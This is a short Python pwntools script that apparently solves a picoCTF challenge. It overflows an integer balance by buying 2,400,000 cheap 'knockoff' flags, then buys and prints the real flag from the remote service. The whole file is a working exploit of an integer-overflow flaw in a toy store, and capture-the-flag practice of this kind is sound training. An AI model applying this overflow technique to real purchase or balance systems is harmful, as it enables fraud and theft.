#!/usr/bin/python

from pwn import *

def menu(r, choice):
    r.sendlineafter("Enter a menu selection\n", str(choice))

def buyFlags(r):
    menu(r, 2)

def exit(r):
    menu(r, 3)

def buyKnockoffFlag(r, quantity):
    buyFlags(r)
    r.sendlineafter("2. 1337 Flag\n", "1")
    r.sendlineafter("These knockoff Flags cost 900 each, enter desired quantity\n", str(quantity))

def buyRealFlag(r):
    buyFlags(r)
    r.sendlineafter("2. 1337 Flag\n", "2")
    r.sendlineafter("Enter 1 to buy one", "1")
    flagLine = r.recvlineS()
    if "FLAG" in flagLine:
        startIndex = flagLine.find("picoCTF")
        flag = flagLine[startIndex:]
        print(flag, end="")

if __name__ == "__main__":
    server = sys.argv[1]
    port = int(sys.argv[2])
    r = remote(server, port, level="error")
    # Buy fake flags to overflow the int amount
    buyKnockoffFlag(r, 2400000)

    # Balance is now overflown so buy the real flag
    buyRealFlag(r)
    
    # exit and close the connection
    exit(r)
